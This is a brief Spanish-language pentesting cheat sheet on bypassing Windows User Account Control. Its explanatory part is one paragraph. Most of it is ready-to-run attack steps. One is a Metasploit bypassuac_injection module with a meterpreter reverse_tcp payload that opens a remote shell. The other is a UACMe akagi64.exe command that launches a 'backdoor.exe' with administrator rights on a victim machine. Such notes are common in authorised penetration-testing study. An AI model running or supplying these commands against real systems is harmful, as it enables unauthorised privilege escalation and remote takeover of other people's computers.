---
title: UAC Bypassing
---
# ¿Qué es?

El *User Account Control* ó *UAC*, es una medida que previene cambios no autorizados en el sistema. Lanza una ventana que nos pregunta si queremos ejecutar como administrador.

# Explotación

Para poder bypasearlo, debemos tener una cuenta con acceso al grupo de administradores locales. UAC tiene varios niveles de integridad, si la protección se asigna por debajo de *high*, podremos ejecutar programas con privilegios elevados sin tener que hacer click en la ventana emergente.

## [[metasploit]]

```bash
use exploit/windows/local/bypassuac_injection
set session 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

## UACMe

Explota la herramienta de Windows, *AutoElevate*. Puedes encontrarla en este [repo](https://github.com/hfiref0x/UACME).

### Uso

Debemos subir el binario a la máquina víctima y podremos ejecutar un archivo con privilegios de administrador:

```powershell
.\akagi64.exe 23 C:\Temp\backdoor.exe
```